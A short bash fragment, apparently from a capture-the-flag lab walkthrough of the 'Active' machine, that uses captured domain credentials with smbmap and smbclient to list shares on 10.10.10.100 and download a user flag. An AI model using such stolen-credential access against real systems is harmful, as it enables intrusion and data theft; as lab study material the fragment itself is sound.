#! /bin/bash

# username and password were captured and then access more shares
smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18


root@kali# smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18                                                                                                         

smb: \SVC_TGS\desktop\> get user.txt
root@kali# cat user.txt

